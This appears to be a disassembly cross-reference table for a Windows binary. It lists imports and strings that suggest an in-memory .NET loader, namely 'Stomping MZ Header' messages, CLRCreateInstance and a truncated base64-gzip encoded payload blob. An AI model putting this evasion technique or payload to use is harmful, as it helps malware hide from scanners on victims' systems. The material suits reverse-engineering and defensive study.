reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1400063a5	0x140021938	string	0x140006348	[-]: Base64 Decoding Failure\n
0x1400063df	0x1400215c8	string	0x140006348	[*]:-----------------------------------------\n
0x140006579	0x140007e00	string	0x14000641c	H;\ra
0x140006659	0x140021028	import	0x140006628	KERNEL32.dll.FreeConsole
0x140006661	0x140021960	string	0x140006628	0|0|0|1|6126976H4sIAAAAAAAEAOy9aawkWXbfF7VMdfcMZzjNGfZIQ5ns4XBpTs507vkybUtiLi/Xl/vyMh9Nk7nvy8s9E5QgfZBIQZYtCYJgWh8MSx8MCjAsLwJkyzBk2IAhgGNAEAHLgi2AIGyatmDQFgzb/EKf87vxlq6uGdbL6mo0gapCZeUScePGjXvP+Z//+Z+I7NVftp5YlvVU/v3+71vW37PMn5+1/uA/f0b+fenH/vMvWf/pO9/9xt97dPHdb1QGw9X7i+W8v2xO3283Z7P5+v1W9/3lZvb+cPZ+LF9+fzrvdD/84hc//xN2G4Vzy+r8+cfWb/3jX/2Nm3Z/1/px6wuPXZb1vz6yrGf3Dvi+6dqjm/ePTb8t6+5/62cf873+eWL97J+7PZPbE/ry/bbuf/PRP+8/tv6Lz33vc188e2wFv/fPf/AfOX7y3scP1939Wv7/3G8/Mn3Tc3/8sV1+8cPlatmW9/RN+sj4/G+PPrLdz77c5eOP9uGx9Tnrd39crudvPbK0pWcfHfWX+vMjrqfWn5D/Zf93Vz9oWZ///LP3VjKwn//CW4/fe/xvDufvyvu35j8kr8/mX5HXH/hnX33r28/emn9V3v+Pz7797Jl59/a3pI0/pn36kvX1D6zPW/TvmfVtj3mvx/lFvrPefbz6YdnFHObz7+tl/Et/RPb+Asf/gfe++Oyt9/h2/p58/uI777nfefut996hJ++85/rNt+nHV57+s6++/e1nbz/fkXeffsv040ctR+qmH1+04mXzvvb4O19YyskuVl+TrY+PP5Ajf/5bP/74yc8/qT/5+W9ZX3E9sX7bYl6++94POL765O35H5UtPvi6vHzn8Ve/9fbX6j/w9pP5j8hHz2/96T+mZ/DeF977YvDX9Djv3G377V+6+fQvyctPfufpjzUdj38s/JWn77zVMLv//Fc+950ffPLu58xWPyovji/efvwxeXn3aeMrz55+53PvPus6Hr/77CvP7BbffVaXn37s6x9IH5+9+7T+j77y1rMfeuuD93W/b2iHHD9ys+lX3v6ht+/98NbX6l9452v1L77zmB78yczv//7vPzPn/G9J/2Vqvrv8gozN5z/4cd3nm9rz+U/o6+on5fWn5j+l0+Brq5/W+fGT8w+YGj/DVvp++Xu/bC3mMhE+P3fo5ssv/4q1WPr/yaPFex9I288+eKIvOvc/+LZuHpZf5t/Ra/728hf0/Yfy/u0PnPL61blLW/jWjz7+wK0XyIqU0xEzyy3rB+Tf1veh60Ovy+sOWfR8Iq+/Lu1/809bVlAG5jfk3zfL6+Vw1l+xzzuWNfknj6xvVsvW/jcfYTu+maimYvL/r8jn/1ea/mZkMm/Z60J6+Sjxw4/ffkc//N4jr/Uea8T6wPxmvSX/9Dfpncx4xo7f9d8TWvjXHpvePrN+/VHo6TMr9FhfrUf/+MkPWg29dNYHj6JPnln/Ia9/mdf3H+vrP+f953j/J3n/1Udfl33/L0tfV3xz9Wj8+Jn1157+jrz+xuOvyeT+h49/7/GXxC78C/n1v7X0+3/K979k/Z68/zW+uXysr/0n+vo32Pff5pu/JN98yfrOk3/x5EvWf/lUXzuWvv471pfl9e/zvvpEW35k/W3Z8q8+/bK8/7tPtSd/6om+/te0+etWlJP/EmdurteXrd98/MetMJ+S7+v3f93aPbUePbL+Dp/+ivVn5JNY5W+Y3/4NqyojmPuG+a1gvfXoqVW3P/3VJ1989My6+HHz6f9+/NVH71i/zac//0e+K734PEf9Bq+/8uTu/U9w1b7D+7/1VN//R0/1Ov0q2wyevmN998kj611L2/ij8vp562fk9ctydfU1xGuY1xSvRV4bvDbl9YetIe+veT3w+hdo7a/I6zdl9P+55ZDX/16u+l+wfu2p1/rPrP+J9999EpPvnVba+ofs9Y+sP/e4av0P1vRp3/pN6z9+MpH3/+7ja3n9755u5Ju/Ld/8pvX3n+zl9W/y+tcf/yn59S8+/bPW71j/s6zj/9P6162/Zv1/1u/K9
0x14000667c	0x140021020	import	0x140006628	KERNEL32.dll.MultiByteToWideChar
0x14000669e	0x140021960	string	0x140006628	0|0|0|1|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
0x1400066b1	0x140021020	import	0x140006628	KERNEL32.dll.MultiByteToWideChar
0x14000683e	0x140007e00	string	0x140006628	H;\ra
0x140006d59	0x1400318b0	string	0x140006d38	\t\t[-]: Not a valid PE DOS Header\n
0x140006e05	0x1400317d8	string	0x140006df0	[+]: Obtaining a handle of the current process: %d\n
0x140006e23	0x140031810	string	0x140006df0	[+]: Scanning for PE DOS Header 'MZ...' pattern...\n
0x140006e5a	0x140031848	string	0x140006df0	[i]: %d PE DOS Headers found.\n
0x140006e6e	0x140031868	string	0x140006df0	[+]: Stomping %d PE DOS headers:\n
0x140006e98	0x140031890	string	0x140006df0	\t[i]: Stomping MZ Header: 0x%x\n
0x140007059	0x140007e00	string	0x140006eec	H;\ra
0x140007f58	0x140021098	import	0x140007f48	KERNEL32.dll.EnterCriticalSection
0x140007f98	0x1400210a0	import	0x140007f48	KERNEL32.dll.LeaveCriticalSection
0x140007fb8	0x140021098	import	0x140007fa8	KERNEL32.dll.EnterCriticalSection
0x140008008	0x1400210a0	import	0x140007fa8	KERNEL32.dll.LeaveCriticalSection
0x140008039	0x1400210b8	import	0x140007fa8	KERNEL32.dll.SetEvent
0x14000804a	0x1400210c0	import	0x140007fa8	KERNEL32.dll.ResetEvent
0x14000808c	0x1400210a0	import	0x140008054	KERNEL32.dll.LeaveCriticalSection
0x14000809e	0x1400210c8	import	0x140008054	KERNEL32.dll.WaitForSingleObjectEx
0x1400080b0	0x140021098	import	0x140008054	KERNEL32.dll.EnterCriticalSection
0x14000812e	0x140007e00	string	0x1400080d8	H;\ra
0x140008147	0x140021108	import	0x14000813c	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008150	0x140021100	import	0x14000813c	KERNEL32.dll.UnhandledExceptionFilter
0x140008156	0x140021110	import	0x14000813c	KERNEL32.dll.GetCurrentProcess
0x140008169	0x140021118	import	0x14000813c	KERNEL32.dll.TerminateProcess
0x14000817e	0x140021120	import	0x14000813c	KERNEL32.dll.IsProcessorFeaturePresent
0x140008196	0x140008364	string	0x14000813c	@SVWH
0x140008265	0x140021120	import	0x140008258	KERNEL32.dll.IsProcessorFeaturePresent
0x140008301	0x1400210e8	import	0x1400082f4	KERNEL32.dll.RtlCaptureContext
0x140008319	0x1400210f0	import	0x1400082f4	KERNEL32.dll.RtlLookupFunctionEntry
0x140008350	0x1400210f8	import	0x1400082f4	KERNEL32.dll.RtlVirtualUnwind
0x14000836f	0x1400210e8	import	0x140008364	KERNEL32.dll.RtlCaptureContext
0x140008389	0x1400210f0	import	0x140008364	KERNEL32.dll.RtlLookupFunctionEntry
0x1400083c0	0x1400210f8	import	0x140008364	KERNEL32.dll.RtlVirtualUnwind
0x140008649	0x1400319a8	string	0x140008644	bad allocation
0x140008900	0x140021120	import	0x1400088e4	KERNEL32.dll.IsProcessorFeaturePresent
0x14000892d	0x1400210e8	import	0x1400088e4	KERNEL32.dll.RtlCaptureContext
0x140008947	0x1400210f0	import	0x1400088e4	KERNEL32.dll.RtlLookupFunctionEntry
0x140008988	0x1400210f8	import	0x1400088e4	KERNEL32.dll.RtlVirtualUnwind
0x1400089dc	0x140021128	import	0x1400088e4	KERNEL32.dll.IsDebuggerPresent
0x1400089fd	0x140021108	import	0x1400088e4	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008a08	0x140021100	import	0x1400088e4	KERNEL32.dll.UnhandledExceptionFilter
0x140008a4c	0x140021130	import	0x140008a30	KERNEL32.dll.GetStartupInfoW
0x140008a7e	0x1400210d8	import	0x140008a78	KERNEL32.dll.GetModuleHandleW
0x140008ad3	0x140021108	import	0x140008acc	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008b68	0x140021150	import	0x140008b3c	KERNEL32.dll.GetSystemTimeAsFileTime
0x140008b76	0x140021148	import	0x140008b3c	KERNEL32.dll.GetCurrentThreadId
0x140008b82	0x140021140	import	0x140008b3c	KERNEL32.dll.GetCurrentProcessId
0x140008b92	0x140021138	import	0x140008b3c	KERNEL32.dll.QueryPerformanceCounter
0x140008bff	0x140021158	import	0x140008bf8	KERNEL32.dll.InitializeSListHead
0x140008f53	0x1400212a8	import	0x140008f53	mscoree.dll.CLRCreateInstance
0x140008fa9	0x140007e00	string	0x140008f70	H;\ra
0x140008ff7	0x140021020	import	0x140008f70	KERNEL32.dll.MultiByteToWideChar
0x140009079	0x140021020	import	0x140008f70	KERNEL32.dll.MultiByteToWideChar
0x140009086	0x140021290	import	0x140008f70	OLEAUT32.dll.SysReAllocString
0x1400090c3	0x140021008	import	0x140008f70	KERNEL32.dll.GetLastError
0x1400090ee	0x140021008	import	0x140008f70	KERNEL32.dll.GetLastError
0x14000954c	0x140021168	import	0x140009508	KERNEL32.dll.RtlPcToFileHeader
0x140009592	0x140021170	import	0x140009508	KERNEL32.dll.RaiseException
0x1400099ec	0x140021178	import	0x1400098e8	KERNEL32.dll.RtlUnwindEx
0x1400099f9	0x140007e00	string	0x1400098e8	H;\ra
0x14000ab13	0x140021178	import	0x14000aa04	KERNEL32.dll.RtlUnwindEx
0x14000acd7	0x140021008	import	0x14000acb8	KERNEL32.dll.GetLastError
0x14000ad5e	0x140021180	import	0x14000acb8	KERNEL32.dll.SetLastError
0x14000b6f2	0x14000b76c	string	0x14000b270	@USVWATAUAVAWH
0x14000b70a	0x140007e00	string	0x14000b270	H;\ra
0x14000b7dc	0x140021188	import	0x14000b76c	KERNEL32.dll.EncodePointer
0x14000ba3c	0x140007e00	string	0x14000b76c	H;\ra
0x14000bd3a	0x14000bd4c	string	0x14000bce0	D9\vt\t
0x14000bf47	0x14000b270	string	0x14000bce0	@USVWATAUAVAWH
0x14000c109	0x140031ae8	string	0x14000c104	bad exception
0x14000c469	0x14000c49b	string	0x14000c374	< u\A
0x14000c874	0x140007e00	string	0x14000c5b4	H;\ra
0x14000cd3f	0x1400210b0	import	0x14000cd20	KERNEL32.dll.DeleteCriticalSection
0x14000cddb	0x1400211b8	import	0x14000cd58	KERNEL32.dll.LoadLibraryExW
0x14000cde9	0x140021008	import	0x14000cd58	KERNEL32.dll.GetLastError
0x14000cdfb	0x140032968	string	0x14000cd58	api-ms-
0x14000ce13	0x1400211b8	import	0x14000cd58	KERNEL32.dll.LoadLibraryExW
0x14000ce59	0x1400211b0	import	0x14000cd58	KERNEL32.dll.FreeLibrary
0x14000ce65	0x1400210e0	import	0x14000cd58	KERNEL32.dll.GetProcAddress
0x14000cead	0x140032980	string	0x14000cea4	FlsAlloc
0x14000cebd	0x140032980	string	0x14000cea4	FlsAlloc
0x14000cee2	0x140021190	import	0x14000cea4	KERNEL32.dll.TlsAlloc
0x14000cef4	0x140032998	string	0x14000ceec	FlsFree
0x14000cf07	0x140032998	string	0x14000ceec	FlsFree
0x14000cf2b	0x1400211a8	import	0x14000ceec	KERNEL32.dll.TlsFree
0x14000cf3c	0x1400329a8	string	0x14000cf34	FlsGetValue
0x14000cf4f	0x1400329a8	string	0x14000cf34	FlsGetValue
0x14000cf73	0x140021198	import	0x14000cf34	KERNEL32.dll.TlsGetValue
0x14000cf89	0x1400329c0	string	0x14000cf7c	FlsSetValue
0x14000cf92	0x1400329c0	string	0x14000cf7c	FlsSetValue
0x14000cfbc	0x1400211a0	import	0x14000cf7c	KERNEL32.dll.TlsSetValue
0x14000cfe2	0x1400329d8	string	0x14000cfd0	InitializeCriticalSectionEx
0x14000cff5	0x1400329d8	string	0x14000cfd0	InitializeCriticalSectionEx
0x14000d01b	0x1400210a8	import	0x14000cfd0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x14000d1c1	0x1400210e8	import	0x14000d148	KERNEL32.dll.RtlCaptureContext
0x14000d1d9	0x1400210f0	import	0x14000d148	KERNEL32.dll.RtlLookupFunctionEntry
0x14000d214	0x1400210f8	import	0x14000d148	KERNEL32.dll.RtlVirtualUnwind
0x14000d24d	0x140021128	import	0x14000d148	KERNEL32.dll.IsDebuggerPresent
0x14000d257	0x140021108	import	0x14000d148	KERNEL32.dll.SetUnhandledExceptionFilter
0x14000d262	0x140021100	import	0x14000d148	KERNEL32.dll.UnhandledExceptionFilter
0x14000d286	0x140007e00	string	0x14000d148	H;\ra
0x14000d3b5	0x140021120	import	0x14000d3ac	KERNEL32.dll.IsProcessorFeaturePresent
0x14000d3da	0x140021110	import	0x14000d3ac	KERNEL32.dll.GetCurrentProcess
0x14000d3ec	0x140021118	import	0x14000d3ac	KERNEL32.dll.TerminateProcess
0x14000d5c8	0x14000d5bc	string	0x14000d54c	f9\nt\tH
0x14000d69d	0x14000d691	string	0x14000d54c	f9\nt\tH
0x14000d6f5	0x14000d6e4	string	0x14000d54c	fA9\t
0x14000d716	0x14000d70a	string	0x14000d54c	f9\nt\tH
0x14000d8b8	0x140021098	import	0x14000d8b4	KERNEL32.dll.EnterCriticalSection
0x14000d8c4	0x1400210a0	import	0x14000d8c0	KERNEL32.dll.LeaveCriticalSection
0x14000e064	0x140007e00	string	0x14000df54	H;\ra
0x14000e539	0x14000e554	string	0x14000e530	<Nu'
0x14000e6d3	0x14000e72b	string	0x14000e6a4	<g~{<itd<ntY<ot7<pt\e<st
0x14000e984	0x140032a70	string	0x14000e928	(null)
0x14000eb10	0x14000eb1f	string	0x14000e9a0	,I<%w
0x14000ed51	0x14000ed5c	string	0x14000ec18	HcS8
0x14000ef16	0x140032a60	string	0x14000eebc	(null)
0x14000ef34	0x140032a70	string	0x14000eebc	(null)
0x14000f0fc	0x140007e00	string	0x14000eff0	H;\ra
0x14000f2d7	0x14000f2f1	string	0x14000f298	8\$8t(H
0x14000f2ed	0x14000f2f1	string	0x14000f298	8\$8t(H
0x14000f36b	0x14000f385	string	0x14000f32c	8\$8t(H
0x14000f381	0x14000f385	string	0x14000f32c	8\$8t(H
0x14000f6c0	0x140007e00	string	0x14000f630	H;\ra
0x14000f768	0x140007e00	string	0x14000f6d8	H;\ra
0x14001323b	0x1400132b5	string	0x140011a5c	E3ɉu blocks=Basic Latin,Latin Extended-B
0x14001366e	0x140013680	string	0x140011a5c	E;ԍC blocks=Basic Latin,Cyrillic Supplement
0x1400137bc	0x140007e00	string	0x140011a5c	H;\ra
0x14001394c	0x140013976	string	0x140013890	E3ɉl$@L blocks=Basic Latin,Latin Extended-B
0x140013dee	0x140013dfa	string	0x140013d58	H;C\bt
0x14001405a	0x140014060	string	0x140013fd4	@8{:t
0x1400140d9	0x1400140e2	string	0x14001408c	L;C\bt
0x140014592	0x1400145b9	string	0x1400144a0	,X< w\eI
0x1400145a6	0x1400145b9	string	0x1400144a0	,X< w\eI
0x1400145ad	0x1400145b9	string	0x1400144a0	,X< w\eI
0x1400149ab	0x140007e00	string	0x1400148a0	H;\ra
0x1400152d7	0x1400152e2	string	0x1400152ac	<"u\a@
0x1400152e0	0x140015301	string	0x1400152ac	< w\tH
0x14001530c	0x140015301	string	0x1400152ac	< w\tH
0x1400154e7	0x1400210d8	import	0x1400154d6	KERNEL32.dll.GetModuleHandleW
0x1400155ad	0x140021110	import	0x140015584	KERNEL32.dll.GetCurrentProcess
0x1400155b8	0x140021118	import	0x140015584	KERNEL32.dll.TerminateProcess
0x1400155c7	0x140021018	import	0x140015584	KERNEL32.dll.ExitProcess
0x1400155e3	0x140033748	string	0x1400155d0	mscoree.dll
0x1400155ec	0x1400211d8	import	0x1400155d0	KERNEL32.dll.GetModuleHandleExW
0x1400155fb	0x140033760	string	0x1400155d0	CorExitProcess
0x140015602	0x1400210e0	import	0x1400155d0	KERNEL32.dll.GetProcAddress
0x14001561f	0x1400211b0	import	0x1400155d0	KERNEL32.dll.FreeLibrary
0x140015fb6	0x140007e00	string	0x140015dd0	H;\ra
0x14001605c	0x140015dd0	string	0x140016034	@UAVAWH
0x1400160a6	0x140021120	import	0x140016080	KERNEL32.dll.IsProcessorFeaturePresent
0x140016b93	0x140021008	import	0x140016b84	KERNEL32.dll.GetLastError
0x140016c31	0x140021180	import	0x140016b84	KERNEL32.dll.SetLastError
0x140016d0f	0x140021008	import	0x140016d00	KERNEL32.dll.GetLastError
0x140016dad	0x140021180	import	0x140016d00	KERNEL32.dll.SetLastError
0x140016e6a	0x1400211e0	import	0x140016e2c	KERNEL32.dll.HeapAlloc
0x140016fb9	0x1400211e0	import	0x140016f64	KERNEL32.dll.HeapAlloc
0x140016ff2	0x1400211e8	import	0x140016fdc	KERNEL32.dll.HeapFree
0x140017004	0x140021008	import	0x140016fdc	KERNEL32.dll.GetLastError
0x1400170bf	0x1400211b8	import	0x14001701c	KERNEL32.dll.LoadLibraryExW
0x1400170cd	0x140021008	import	0x14001701c	KERNEL32.dll.GetLastError
0x1400170e1	0x140033f68	string	0x14001701c	api-ms-
0x1400170f4	0x140033f78	string	0x14001701c	ext-ms-
0x14001710f	0x1400211b8	import	0x14001701c	KERNEL32.dll.LoadLibraryExW
0x140017148	0x1400211b0	import	0x14001701c	KERNEL32.dll.FreeLibrary
